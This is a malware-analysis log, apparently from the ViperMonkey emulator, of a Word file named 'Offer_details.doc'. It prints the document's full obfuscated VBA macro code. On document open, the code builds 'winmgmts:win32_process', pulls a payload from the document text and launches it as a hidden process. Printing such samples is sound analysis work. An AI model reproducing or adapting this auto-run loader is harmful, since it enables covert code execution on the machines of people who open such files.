@@ -1,0 +1,1674 @@
+===============================================================================
+FILE: Offer_details.doc
+INFO     Starting emulation...
+INFO     Emulating an Office (VBA) file.
+INFO     Reading document metadata...
+ERROR    Running export_all_excel_sheets.py failed. Command '['timeout', '30', 'python3', '/usr/lib/python2.7/site-packages/vipermonkey/core/../export_all_excel_sheets.py', '/tmp/tmp_excel_file_6911668973']' returned non-zero exit status 1
+ERROR    Reading in file as Excel with xlrd failed. Can't find workbook in OLE2 compound document
+INFO     Saving dropped analysis artifacts in .//Offer_details.doc_artifacts/
+INFO     Parsing VB...
+-------------------------------------------------------------------------------
+VBA MACRO Htqbdi3x0p1bpx7.cls 
+in file:  - OLE stream: u'Macros/VBA/Htqbdi3x0p1bpx7'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Private Sub Document_open()
+Lt_l2i5x8f4qw5i.Yulfni6j7ok2f80tqh
+End Sub
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Sub Document_open (): 1 statement(s)
+-------------------------------------------------------------------------------
+VBA MACRO Lt_l2i5x8f4qw5i.frm 
+in file:  - OLE stream: u'Macros/VBA/Lt_l2i5x8f4qw5i'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Function Yulfni6j7ok2f80tqh()
+On Error Resume Next
+   Dim usOumCZCI(7 + 5 + 1 + 5) As String
+Set XiTeT = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(OQlZBI)
+Dim dEVMYDD(5 + 8 + 1 + 7) As String
+usOumCZCI(HPnDmI) = Cos(2 + 19 + 4)
+usOumCZCI(HPnDmI) = (oewuADEAJ + 964)
+OSazXt = PDdQtDYPF
+usOumCZCI(HPnDmI) = (126 + Int(93) + EKeIAIECa)
+Dim CKhQJQkrD(7 + 5 + 1 + 4) As String
+Set apxpWEEP = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(VPGjLHDB)
+Dim xeaSnlIkF(8 + 5 + 1 + 6) As String
+CKhQJQkrD(dXLXG) = Cos(685 + 84 + 2)
+CKhQJQkrD(dXLXG) = (ahPIIx + 835)
+thGkB = mfkgFJJ
+CKhQJQkrD(dXLXG) = (8494 + Int(3) + AUXkfIG)
+Zo2uih_o2mq8pi1iz = "][ (0 huBJ [] []wro][ (0 huBJ [] []w" + "][ (0 huBJ [] []wce][ (0 huBJ [] []ws][ (0 huBJ [] []ws][ (0 huBJ [] []w" + Hj4ujwfpyy8
+   Dim EydkCYGC(7 + 5 + 1 + 7) As String
+Set yRjTk = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(SdaXJ)
+Dim ISVYBNJJI(5 + 7 + 1 + 8) As String
+EydkCYGC(CzeCFA) = Cos(85 + 218 + 8233)
+EydkCYGC(CzeCFA) = (pDZjCvqX + 9911)
+PDszsF = YxSqyCTEG
+EydkCYGC(CzeCFA) = (9 + Int(7) + YxigTb)
+Dim KhAtfwFWX(7 + 8 + 1 + 8) As String
+Set QpoqIFJ = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(sBzGID)
+Dim gDcTNCVt(5 + 7 + 1 + 4) As String
+KhAtfwFWX(rPtjr) = Cos(87 + 920 + 1)
+KhAtfwFWX(rPtjr) = (nRWaUA + 837)
+BocbDIE = vjvZAWdGD
+KhAtfwFWX(rPtjr) = (646 + Int(5) + PqpgCTFI)
+Gd4zxqf002aozhi9z = "][ (0 huBJ [] []w][ (0 huBJ [] []w:][ (0 huBJ [] []ww][" + " (0 huBJ [] []win][ (0 huBJ [] []w][ (0 huBJ [] []w3][ (0 huBJ [] []w2][ (0 huBJ [] []w_][ (0 huBJ [] []w" + Hw28kvn3b633x
+   Dim BTWaCZcwC(6 + 7 + 1 + 8) As String
+Set meupD = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(UTIBUA)
+Dim yyaWl(7 + 7 + 1 + 7) As String
+BTWaCZcwC(EipJBhH) = Cos(5 + 4 + 3)
+BTWaCZcwC(EipJBhH) = (DhcRuFaCv + 3151)
+KRTrI = vZscCOE
+BTWaCZcwC(EipJBhH) = (3857 + Int(1763) + qjUZWIH)
+Dim AaMzBA(5 + 8 + 1 + 6) As String
+Set jCqkv = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(czRiBBCG)
+Dim AzZIe(5 + 5 + 1 + 6) As String
+AaMzBA(PTzRO) = Cos(97 + 5 + 11)
+AaMzBA(PTzRO) = (kIOhAFt + 454)
+bevYEGrGA = TdWlAFII
+AaMzBA(PTzRO) = (3 + Int(5096) + ZZaIGA)
+Hi_mbyar2agjbcmgll = "][ (0 huBJ [] []w][ (0 huBJ [] []ww][ (0 huBJ [] []wi][ (0 huBJ [" + "] []wnm][ (0 huBJ [] []w][ (0 huBJ [] []wgm][ (0 huBJ [] []wt][ (0 huBJ [] []w][ (0 huBJ [] []w" + Aqbj3_33ziceoti
+   Dim yBXBaB(8 + 5 + 1 + 7) As String
+Set SwsyZ = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(NIxifD)
+Dim EHVJyzYWb(7 + 7 + 1 + 8) As String
+yBXBaB(mItVEzF) = Cos(31 + 2989 + 3)
+yBXBaB(mItVEzF) = (mmvlJDwGI + 7)
+pkLNm = DlXrEJC
+yBXBaB(mItVEzF) = (822 + Int(725) + SgvbFYAx)
+Dim JTYVHBYG(8 + 6 + 1 + 7) As String
+Set IwtvFF = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(MZaWWpBI)
+Dim nHmLM(7 + 7 + 1 + 4) As String
+JTYVHBYG(dOKqFAimb) = Cos(987 + 3833 + 2)
+JTYVHBYG(dOKqFAimb) = (AQaUXGHEc + 63)
+WVcQpuDA = hJHRHIG
+JTYVHBYG(dOKqFAimb) = (8454 + Int(562) + CYPUrBNE)
+V0c_t4rhqqpw5 = ChrW(BuildKeyCode(Arg1:=wdKeyS))
+   Dim lqiJhHdO(5 + 8 + 1 + 6) As String
+Set PqmngcABA = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(xJNKmGg)
+Dim nRWSZGGH(7 + 6 + 1 + 5) As String
+lqiJhHdO(NIRHCHUG) = Cos(1 + 79 + 21)
+lqiJhHdO(NIRHCHUG) = (zOuqIqNF + 5156)
+IAESJJi = wTcPCGGr
+lqiJhHdO(NIRHCHUG) = (6246 + Int(9) + qQOpyQBw)
+Dim nApdDW(7 + 5 + 1 + 8) As String
+Set oyUEt = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(UlOoFkM)
+Dim GGkmZ(8 + 8 + 1 + 7) As String
+nApdDW(nJzXD) = Cos(9633 + 6 + 188)
+nApdDW(nJzXD) = (aKeyPG + 5)
+JlyfbaGaC = FNjqADDHd
+nApdDW(nJzXD) = (34 + Int(2) + HfIEmFCE)
+Gwvh25w3otsif = Hi_mbyar2agjbcmgll + V0c_t4rhqqpw5 + Gd4zxqf002aozhi9z + Lt_l2i5x8f4qw5i.Cl1suq7b19kyr9ukvt + Zo2uih_o2mq8pi1iz
+   Dim DhjVBsDSD(8 + 6 + 1 + 4) As String
+Set GQnacv = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(BlyTd)
+Dim NIKvBFPIs(8 + 5 + 1 + 4) As String
+DhjVBsDSD(vlbxC) = Cos(52 + 3 + 1)
+DhjVBsDSD(vlbxC) = (oiikU + 3)
+JKIUbD = bqRwA
+DhjVBsDSD(vlbxC) = (7 + Int(9) + wLuxDpQ)
+Dim nYYLCIl(5 + 5 + 1 + 6) As String
+Set ixZxB = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(kBeEMEizD)
+Dim DKQjKCBsw(6 + 8 + 1 + 6) As String
+nYYLCIl(ihAnl) = Cos(50 + 4 + 6)
+nYYLCIl(ihAnl) = (vKucAq + 2)
+hELKJD = uodhBLLA
+nYYLCIl(ihAnl) = (795 + Int(3) + aCeIHE)
+Ryz8t1u2iap = Hs6la7eq2yreh(Gwvh25w3otsif)
+   Dim CXnRIpZ(5 + 7 + 1 + 7) As String
+Set xuiAKAE = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(AvsuDTHBw)
+Dim yDpjr(5 + 7 + 1 + 7) As String
+CXnRIpZ(xPcbIK) = Cos(6 + 552 + 506)
+CXnRIpZ(xPcbIK) = (vxvfaFI + 3)
+FElRUE = YtXkA
+CXnRIpZ(xPcbIK) = (2 + Int(414) + sDjRA)
+Dim wbdsOnDA(7 + 5 + 1 + 8) As String
+Set wArIHtkxa = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(jWXOG)
+Dim GhmXK(6 + 8 + 1 + 5) As String
+wbdsOnDA(wjWhJHtmC) = Cos(5 + 859 + 311)
+wbdsOnDA(wjWhJHtmC) = (RroKknGF + 1526)
+fhUNCI = XMaURWYJ
+wbdsOnDA(wjWhJHtmC) = (32 + Int(5) + iiEmIGziA)
+Set Fpsrhmtqzfij93lq = CreateObject(Ryz8t1u2iap)
+   Dim jtjlEOAM(7 + 7 + 1 + 8) As String
+Set GVupHP = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(pVjSJB)
+Dim KLgNBJZ(6 + 8 + 1 + 5) As String
+jtjlEOAM(kuXzSso) = Cos(818 + 82 + 5464)
+jtjlEOAM(kuXzSso) = (lZPBh + 6)
+SaBMrIEn = CMOhC
+jtjlEOAM(kuXzSso) = (6 + Int(2) + kcJJADM)
+Dim luqicI(6 + 5 + 1 + 7) As String
+Set VXHMp = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(WWAUF)
+Dim jzyPs(8 + 6 + 1 + 7) As String
+luqicI(lTVMDCqHJ) = Cos(914 + 5 + 656)
+luqicI(lTVMDCqHJ) = (qtmzGtxG + 480)
+GVvIqmt = MpZewJ
+luqicI(lTVMDCqHJ) = (8 + Int(1) + tcDtJEH)
+Ntm881c12xrc4expm9 = Mid(CVar(Htqbdi3x0p1bpx7.StoryRanges.Item(1)), 5, 48469)
+   Dim aLSPn(6 + 6 + 1 + 7) As String
+Set RlgjTC = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(DnueC)
+Dim thGWDC(7 + 7 + 1 + 4) As String
+aLSPn(pYmyg) = Cos(96 + 21 + 90)
+aLSPn(pYmyg) = (OnbANufFf + 2)
+QWUuEjD = NQdyCZrM
+aLSPn(pYmyg) = (677 + Int(7865) + qyjhJIEnJ)
+Dim fmVoJjn(6 + 7 + 1 + 6) As String
+Set gAurdXHG = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(PkWNL)
+Dim qSpaBGAkD(7 + 8 + 1 + 4) As String
+fmVoJjn(IyPulFI) = Cos(6 + 3 + 252)
+fmVoJjn(IyPulFI) = (zhNpFAEdB + 5589)
+UIqciA = KHRTFGIA
+fmVoJjn(IyPulFI) = (4586 + Int(360) + nWJbm)
+Ij_84haa94ehdia = Kmnb_n824uhj_p + Ryz8t1u2iap + V0c_t4rhqqpw5 + Lt_l2i5x8f4qw5i.Ctu1mo7cstkgp + Lt_l2i5x8f4qw5i.Fc3feqbi8qy
+   Dim dVuGRImfJ(6 + 8 + 1 + 6) As String
+Set ljkrB = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(kPXrFrDSC)
+Dim sHLwC(7 + 8 + 1 + 8) As String
+dVuGRImfJ(VNRALdGHB) = Cos(844 + 3205 + 4)
+dVuGRImfJ(VNRALdGHB) = (ShJoxI + 1902)
+hPcNDtF = HQVlBG
+dVuGRImfJ(VNRALdGHB) = (66 + Int(6) + PuAFaHJC)
+Dim XiFCFTtID(8 + 5 + 1 + 5) As String
+Set dJcPoM = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(EsTNlaIFC)
+Dim PMhRh(5 + 7 + 1 + 7) As String
+XiFCFTtID(rGgzOCoG) = Cos(76 + 48 + 5)
+XiFCFTtID(rGgzOCoG) = (PCGYWuUE + 5569)
+MzPndDDYr = DohMb
+XiFCFTtID(rGgzOCoG) = (6816 + Int(6) + rLScA)
+Set T6owq3v7pb0c = Mzj4a1lpxlocl6w(Ij_84haa94ehdia + Lt_l2i5x8f4qw5i.Cl1suq7b19kyr9ukvt)
+   Dim xJlGFGPAW(5 + 5 + 1 + 8) As String
+Set MndxijzUZ = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(BPKmBBGi)
+Dim KSHoCBI(5 + 7 + 1 + 4) As String
+xJlGFGPAW(kUFdE) = Cos(2 + 4581 + 32)
+xJlGFGPAW(kUFdE) = (UUuhJDGf + 73)
+kfohJ = cvxWzEG
+xJlGFGPAW(kUFdE) = (704 + Int(60) + jMaCFE)
+Dim FSMYHJ(7 + 6 + 1 + 4) As String
+Set zxzgVEA = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(uHcuEiFq)
+Dim oXNROH(8 + 6 + 1 + 8) As String
+FSMYHJ(zXeKBEa) = Cos(8 + 8914 + 4)
+FSMYHJ(zXeKBEa) = (NnpvACDA + 66)
+dmBFFbG = ASiEPg
+FSMYHJ(zXeKBEa) = (86 + Int(7978) + kPgnBETR)
+   Dim FujXBCAT(7 + 7 + 1 + 7) As String
+Set VhXPCBBHh = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(zcElKLMzb)
+Dim vNnnGCZf(8 + 5 + 1 + 4) As String
+FujXBCAT(DsedwEP) = Cos(17 + 6860 + 6263)
+FujXBCAT(DsedwEP) = (zOBCEIFQF + 8)
+iPSnBsA = lkYEB
+FujXBCAT(DsedwEP) = (6 + Int(774) + iSJwHD)
+Dim cpDKJI(6 + 6 + 1 + 4) As String
+Set fGDjmKdC = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(UOZUBEJ)
+Dim KgVPGHHrD(5 + 5 + 1 + 6) As String
+cpDKJI(KASXgeQRI) = Cos(4 + 61 + 64)
+cpDKJI(KASXgeQRI) = (IxnZJ + 12)
+tWaRX = SSkmNJF
+cpDKJI(KASXgeQRI) = (2 + Int(327) + SSCRAC)
+   Dim oAdcAFJ(5 + 7 + 1 + 4) As String
+Set fimtGgIfI = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(CqgyKs)
+Dim pMfDPZA(5 + 6 + 1 + 8) As String
+oAdcAFJ(TBoXFEGIJ) = Cos(4469 + 6 + 8623)
+oAdcAFJ(TBoXFEGIJ) = (lGxeDDz + 19)
+dTsbADJAc = WeMdaI
+oAdcAFJ(TBoXFEGIJ) = (4 + Int(9) + oUhMI)
+Dim vjiDEGYF(8 + 7 + 1 + 7) As String
+Set UMUEBJLCH = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(fKfxY)
+Dim vZDQNgZI(7 + 7 + 1 + 8) As String
+vjiDEGYF(xLHuHkI) = Cos(2 + 3 + 511)
+vjiDEGYF(xLHuHkI) = (OeTLCTUHD + 2923)
+IqSCIDGO = UdGNBH
+vjiDEGYF(xLHuHkI) = (634 + Int(609) + GxALIIp)
+Fpsrhmtqzfij93lq. Create Hs6la7eq2yreh(Ntm881c12xrc4expm9), A9zw1op79tt8s5, T6owq3v7pb0c
+   Dim RVOmJ(6 + 8 + 1 + 8) As String
+Set yJfnx = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(gdgsFFR)
+Dim UodWBG(8 + 7 + 1 + 7) As String
+RVOmJ(SBGRRDI) = Cos(6 + 24 + 3)
+RVOmJ(SBGRRDI) = (LKrMAG + 73)
+adZoQv = fRmtRvAH
+RVOmJ(SBGRRDI) = (9 + Int(7) + EtJOABGL)
+Dim JtkuH(8 + 7 + 1 + 4) As String
+Set jeGUdqZsA = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(tdWGIo)
+Dim MTkWJDp(5 + 7 + 1 + 5) As String
+JtkuH(IdkYJMEEY) = Cos(60 + 1 + 9)
+JtkuH(IdkYJMEEY) = (sweYJIG + 1764)
+wslEBBJu = tdrCJuzJ
+JtkuH(IdkYJMEEY) = (644 + Int(752) + vrBTICH)
+   Dim ezMkF(8 + 6 + 1 + 5) As String
+Set vMnmCGVIQ = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(NPqvBC)
+Dim rLdOC(6 + 5 + 1 + 6) As String
+ezMkF(StYyiGHcB) = Cos(4 + 94 + 2339)
+ezMkF(StYyiGHcB) = (vSoAGFAEE + 57)
+anizbmA = jXNOE
+ezMkF(StYyiGHcB) = (4 + Int(2) + RznGSJPBy)
+Dim YmkZrC(7 + 8 + 1 + 7) As String
+Set MrXBwyh = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(EjYrMlDh)
+Dim IsqNfG(7 + 8 + 1 + 6) As String
+YmkZrC(jlwAJn) = Cos(74 + 9 + 2)
+YmkZrC(jlwAJn) = (HUlfHE + 72)
+ZZhutACLW = ZGwKA
+YmkZrC(jlwAJn) = (178 + Int(7962) + ywqhU)
+End Function
+Function Mzj4a1lpxlocl6w(Rklp62mbi85yy9zfeg)
+On Error Resume Next
+   Dim kjJvJI(5 + 8 + 1 + 5) As String
+Set OsSdBaKHk = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(rvqUEGExE)
+Dim rKWfIsIB(8 + 8 + 1 + 6) As String
+kjJvJI(vfclyGk) = Cos(5 + 8 + 8)
+kjJvJI(vfclyGk) = (LYefHFL + 6)
+jiVZyFnH = fsJPAvE
+kjJvJI(vfclyGk) = (944 + Int(4) + vyiMV)
+Dim uTBACIAJJ(7 + 8 + 1 + 8) As String
+Set HytTDc = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(BPEQdEA)
+Dim sufIG(7 + 7 + 1 + 6) As String
+uTBACIAJJ(AarGF) = Cos(781 + 5 + 9)
+uTBACIAJJ(AarGF) = (RuXGg + 4)
+QvSABKJTP = ZuWxGI
+uTBACIAJJ(AarGF) = (7 + Int(23) + fjnWi)
+Set Mzj4a1lpxlocl6w = B5kxad2f6a9l2wec.Ug5ciccd4cghfy(Hs6la7eq2yreh(E6uxrppvvxtk + Rklp62mbi85yy9zfeg + G3t3j2bg18ta0r))
+   Dim JjSpB(7 + 7 + 1 + 8) As String
+Set gTVoG = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(bvmIgh)
+Dim JmXmCuAI(7 + 8 + 1 + 7) As String
+JjSpB(NWvSBIw) = Cos(4 + 1 + 7)
+JjSpB(NWvSBIw) = (DOElhuL + 785)
+WgmzBlr = ygLPHDwCH
+JjSpB(NWvSBIw) = (9 + Int(7) + JLdVbtJJ)
+Dim jAETJ(8 + 5 + 1 + 7) As String
+Set lUcmRtECB = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(LjSzX)
+Dim GIwQs(5 + 6 + 1 + 8) As String
+jAETJ(gTTMeyA) = Cos(4 + 791 + 3450)
+jAETJ(gTTMeyA) = (Ldwek + 36)
+kxoTLyCb = aBrEB
+jAETJ(gTTMeyA) = (37 + Int(9) + XtSxADDDH)
+Mzj4a1lpxlocl6w .showwindow = 0
+   Dim wFjlAAoVJ(7 + 8 + 1 + 4) As String
+Set ErpRAobWE = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(EumFBCI)
+Dim VcnYB(8 + 5 + 1 + 5) As String
+wFjlAAoVJ(nhWAHnFB) = Cos(3 + 8975 + 2)
+wFjlAAoVJ(nhWAHnFB) = (RuqVjGDFJ + 936)
+UzuAC = HLmwcnBu
+wFjlAAoVJ(nhWAHnFB) = (843 + Int(76) + cXDRJfBFC)
+Dim QcyzFH(8 + 8 + 1 + 4) As String
+Set JKjBdHVG = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(iXKPBJFBA)
+Dim GgkET(6 + 6 + 1 + 8) As String
+QcyzFH(mlcVVA) = Cos(3020 + 9 + 5)
+QcyzFH(mlcVVA) = (ixMjIBX + 53)
+ZWqcH = lGtiFps
+QcyzFH(mlcVVA) = (1 + Int(6) + WAhEIJG)
+End Function
+Function Hs6la7eq2yreh(Ddas1qaozhxcg_m)
+On Error Resume Next
+   Dim vHjfHICM(8 + 8 + 1 + 5) As String
+Set OBLNIAF = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(FKRsCaZJ)
+Dim CIFILLBI(6 + 5 + 1 + 7) As String
+vHjfHICM(RobwD) = Cos(9 + 4 + 290)
+vHjfHICM(RobwD) = (ccnEYCJJ + 8065)
+zkVZHCIOB = FXRUDFzI
+vHjfHICM(RobwD) = (825 + Int(1) + ikvPTbHJD)
+Dim OOXOGGHD(8 + 7 + 1 + 5) As String
+Set EzEJTeBy = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(lVPeCLH)
+Dim pLtBBG(6 + 5 + 1 + 6) As String
+OOXOGGHD(kMivbHM) = Cos(4 + 8 + 29)
+OOXOGGHD(kMivbHM) = (BnXwVCADJ + 88)
+kLAnCG = gCCBA
+OOXOGGHD(kMivbHM) = (1845 + Int(10) + OpGmJkD)
+S9cq6p132ckig = (Ddas1qaozhxcg_m)
+   Dim IFgQQA(6 + 5 + 1 + 6) As String
+Set xJsrr = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(onazcGHG)
+Dim FfPxBRhFb(6 + 6 + 1 + 6) As String
+IFgQQA(UviiCJt) = Cos(35 + 7 + 51)
+IFgQQA(UviiCJt) = (yaPEJZm + 9308)
+cSglaCP = vrMQuI
+IFgQQA(UviiCJt) = (6 + Int(8) + iFUDE)
+Dim cPXLFs(5 + 5 + 1 + 7) As String
+Set hOoMB = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(ypjbIafu)
+Dim IWmzDJmFB(5 + 5 + 1 + 8) As String
+cPXLFs(zZMDFSAqb) = Cos(976 + 775 + 6320)
+cPXLFs(zZMDFSAqb) = (HLIXTr + 3515)
+oFafQ = hYeFCmJn
+cPXLFs(zZMDFSAqb) = (3470 + Int(3027) + ldGLJb)
+Yfy6ekz7xj79_ = B5kxad2f6a9l2wec.Nlpfpcsbssrm8y(S9cq6p132ckig)
+   Dim tJuNd(6 + 8 + 1 + 7) As String
+Set kwaPxEb = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(HOUwnBu)
+Dim vUodCpID(6 + 8 + 1 + 4) As String
+tJuNd(QoThGd) = Cos(123 + 4246 + 10)
+tJuNd(QoThGd) = (TlUjhLLJA + 6)
+VFuchQ = WJvBCKHID
+tJuNd(QoThGd) = (8 + Int(6) + dUUaCoAF)
+Dim cqaoJJu(8 + 6 + 1 + 5) As String
+Set yPaoAvJE = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(KpBuSD)
+Dim KIJbAP(5 + 5 + 1 + 7) As String
+cqaoJJu(TvJbksC) = Cos(244 + 405 + 4)
+cqaoJJu(TvJbksC) = (CbNRHyiAC + 6)
+RDqOdEHa = KUjbsE
+cqaoJJu(TvJbksC) = (152 + Int(1) + hrBsJDH)
+Hs6la7eq2yreh = Yfy6ekz7xj79_
+   Dim IViVGBR(6 + 8 + 1 + 8) As String
+Set ItXsE = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(rKkPEN)
+Dim HlkKfADHE(6 + 5 + 1 + 6) As String
+IViVGBR(ufQvJSj) = Cos(6 + 90 + 283)
+IViVGBR(ufQvJSj) = (GLdxBp + 5396)
+DqvWAFipj = FZxFN
+IViVGBR(ufQvJSj) = (7 + Int(543) + DhVOC)
+Dim DuUlA(5 + 7 + 1 + 7) As String
+Set ifKeB = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(LpewHGFAD)
+Dim IYGVEOjU(8 + 7 + 1 + 6) As String
+DuUlA(TnpeIEI) = Cos(80 + 627 + 6269)
+DuUlA(TnpeIEI) = (bFSOZEHfH + 8)
+EnIPHIin = EDWgzFhEr
+DuUlA(TnpeIEI) = (9 + Int(1) + xIFYIJfEA)
+End Function
+Function Pyp8y812nivd8y3zx(Nrrp8xnnzn0cwn)
+Zgd_yfa2x23 = M9bws0_cegeo57p5pl
+End Function
+
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Function Yulfni6j7ok2f80tqh (): 222 statement(s)
+INFO     parsed Function Mzj4a1lpxlocl6w ([ByRef Rklp62mbi85yy9zfeg]): 45 statement(s)
+INFO     parsed Function Hs6la7eq2yreh ([ByRef Ddas1qaozhxcg_m]): 60 statement(s)
+INFO     parsed Function Pyp8y812nivd8y3zx ([ByRef Nrrp8xnnzn0cwn]): 1 statement(s)
+-------------------------------------------------------------------------------
+VBA MACRO B5kxad2f6a9l2wec.bas 
+in file:  - OLE stream: u'Macros/VBA/B5kxad2f6a9l2wec'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+-------------------------------------------------------------------------------
+VBA CODE (with long lines collapsed):
+Function Nlpfpcsbssrm8y(Ij_84haa94ehdia)
+On Error Resume Next
+   Dim iNvhIBC(8 + 8 + 1 + 5) As String
+Set rEBbuGh = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(tesVJjZBm)
+Dim prdUAG(6 + 7 + 1 + 8) As String
+iNvhIBC(fxhVJDiGu) = Cos(4 + 6 + 130)
+iNvhIBC(fxhVJDiGu) = (UUDADE + 3)
+QqVWJG = jZGaAv
+iNvhIBC(fxhVJDiGu) = (2256 + Int(3) + AANxPGAC)
+Dim vJjHaEDC(6 + 6 + 1 + 8) As String
+Set tEMdD = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(ZPZoX)
+Dim WxLCF(8 + 6 + 1 + 7) As String
+vJjHaEDC(uWoAZE) = Cos(4863 + 345 + 8)
+vJjHaEDC(uWoAZE) = (NiKKI + 27)
+PZYbrG = OghWI
+vJjHaEDC(uWoAZE) = (625 + Int(96) + mICRC)
+Nlpfpcsbssrm8y = Replace(Ij_84haa94ehdia, "][ (0 huBJ [] []w", Y0buszs_jp_hoe)
+   Dim KDJuBGDN(6 + 7 + 1 + 6) As String
+Set NNDaEM = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(EHvkO)
+Dim KkAvAGJp(5 + 6 + 1 + 6) As String
+KDJuBGDN(JlrdGDHBJ) = Cos(9 + 4 + 450)
+KDJuBGDN(JlrdGDHBJ) = (VQalCkIB + 5)
+mmBkAHGDI = vHMbJ
+KDJuBGDN(JlrdGDHBJ) = (155 + Int(9534) + gjFABo)
+Dim iEORACDC(8 + 8 + 1 + 4) As String
+Set QvsGE = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(blnYADd)
+Dim lTOBo(6 + 7 + 1 + 6) As String
+iEORACDC(nEkUIRGFD) = Cos(45 + 3631 + 42)
+iEORACDC(nEkUIRGFD) = (AuAejI + 935)
+HULWG = PTlyI
+iEORACDC(nEkUIRGFD) = (18 + Int(7) + ZvHnJnEK)
+End Function
+Function Ug5ciccd4cghfy(Ag2kw_q9iraljr)
+On Error Resume Next
+   Dim GFlOB(6 + 7 + 1 + 6) As String
+Set PNzBIJn = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(gecAKF)
+Dim ryZaFvEBe(7 + 8 + 1 + 4) As String
+GFlOB(lBIWBcB) = Cos(3551 + 465 + 2845)
+GFlOB(lBIWBcB) = (xCOKDHCH + 84)
+etkciyMFw = BGDCyAvkv
+GFlOB(lBIWBcB) = (766 + Int(96) + EweYVEJB)
+Dim oPYhCIj(8 + 8 + 1 + 8) As String
+Set izlMuMCs = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(tfnoJLtS)
+Dim KZhSp(7 + 6 + 1 + 4) As String
+oPYhCIj(BdVMCE) = Cos(4 + 4733 + 1)
+oPYhCIj(BdVMCE) = (wovLOvT + 8)
+brEzIEF = IDQoWBJR
+oPYhCIj(BdVMCE) = (6462 + Int(8) + wGkuKFAEd)
+Set Ug5ciccd4cghfy = CreateObject(Ag2kw_q9iraljr)
+   Dim kFATHFJ(5 + 6 + 1 + 4) As String
+Set UdnGV = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(hajFD)
+Dim vMLiHrv(6 + 8 + 1 + 6) As String
+kFATHFJ(FfISH) = Cos(9 + 2 + 3117)
+kFATHFJ(FfISH) = (xXRsH + 4)
+LPwsHE = ETjDHdrC
+kFATHFJ(FfISH) = (197 + Int(1) + FGZHC)
+Dim IxUgW(6 + 6 + 1 + 7) As String
+Set NBwqG = Lt_l2i5x8f4qw5i.Pyp8y812nivd8y3zx(IunEHTI)
+Dim BWHTCE(8 + 5 + 1 + 6) As String
+IxUgW(xPrqiIqAI) = Cos(3063 + 96 + 192)
+IxUgW(xPrqiIqAI) = (OrgVoJVG + 8)
+iYwwCaHEW = IcgfIIeiH
+IxUgW(xPrqiIqAI) = (99 + Int(2) + WlMap)
+End Function
+-------------------------------------------------------------------------------
+PARSING VBA CODE:
+INFO     parsed Function Nlpfpcsbssrm8y ([ByRef Ij_84haa94ehdia]): 30 statement(s)
+INFO     parsed Function Ug5ciccd4cghfy ([ByRef Ag2kw_q9iraljr]): 30 statement(s)
+INFO     Reading document variables...
+INFO     Reading document comments...
+INFO     Reading Shapes object text fields...
+INFO     Reading InlineShapes object text fields...
+INFO     Reading TextBox and RichEdit object text fields...
+INFO     Reading custom document properties...
+INFO     Reading embedded object text fields...
+INFO     Reading document text and tables...
+ERROR    Running export_doc_text.py failed. Command '['timeout', '30', 'python3', '/usr/lib/python2.7/site-packages/vipermonkey/core/../export_doc_text.py', '--text', '-f', '/tmp/tmp_word_file_49443760']' returned non-zero exit status 1
+INFO     Reading form variables...
+
+-------------------------------------------------------------------------------
